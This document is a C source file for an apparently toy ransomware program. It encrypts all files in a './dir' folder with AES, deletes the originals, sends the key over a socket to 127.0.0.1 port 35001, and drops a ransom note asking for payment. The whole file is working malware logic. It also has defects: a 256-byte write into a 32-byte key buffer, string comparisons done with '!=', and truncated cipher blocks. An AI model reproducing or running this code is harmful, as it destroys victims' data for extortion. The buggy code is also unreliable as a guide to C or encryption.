#include <time.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/aes.h>

#define SIZE 512
#define PORT 35001

//Key for AES encryption
unsigned char key[32];

AES_KEY enc_key, dec_key;

FILE *inFile;  //Pointer to file to be encrypted
FILE *outFile; //Pointer to output file
unsigned char buffer[SIZE];
size_t bytes;
char *cpArr;

//Ecrypts a given file
void encryptFile(char *file){
    unsigned char encOut[SIZE];
    char *output = malloc(strlen(file) + 11);
    char ext[11] = ".Encrypted";
    strcpy(output, file);
    strcat(output, ext);

    //set the encrpytion key
    AES_set_encrypt_key(key, 128, &enc_key);

    inFile = fopen(file, "rb");
    outFile = fopen(output, "wb");
    while(0 != (bytes = fread(buffer, 1, SIZE, inFile))){
        AES_encrypt(buffer, encOut, &enc_key);
        fwrite(encOut, 1, bytes, outFile);
    }

    fclose(inFile);
    fclose(outFile);
    
    remove(file);
    free(output);
}

//Generates random encryption key
void generateKey(){
    static const char alphanum[] = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < 256; ++i) {
        key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }
}

//Encrypts files on the system
int encryptFiles(){
    struct dirent *de;

    DIR *dir = opendir("./dir"); 

    if (dir == NULL) 
    { 
        printf("Could not open current directory" ); 
        return 0; 
    } 

    while ((de = readdir(dir)) != NULL) 
        if(de->d_name != "." && de->d_name != ".."){
            char *file = malloc(strlen(de->d_name) + 6);
            strcpy(file, "./dir/");
            strcat(file, de->d_name);
            encryptFile(file);
            free(file);
        } 

    closedir(dir);     
    return 0;
}


//Creates Ransom Note
void createRansomNote(){
    const char *text = "You have been infected, pay plz";

    FILE *note = fopen("RansomNote", "w");
    fprintf(note, "%s", text);

    fclose(note);
}

//Sends key to remote server
void sendKey(){
    struct sockaddr_in address;
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    connect(sock, (struct sockaddr *)&serv_addr,sizeof(serv_addr));
    send(sock, key, strlen(key), 0);
    shutdown(sock, 2);
}

int main(){
    srand(time(NULL));
    generateKey();
    encryptFiles();
    printf("encrypted\n");
    sendKey();
    printf("key should have sent\n");
    createRansomNote();
    printf("done\n");
    return 0;
}
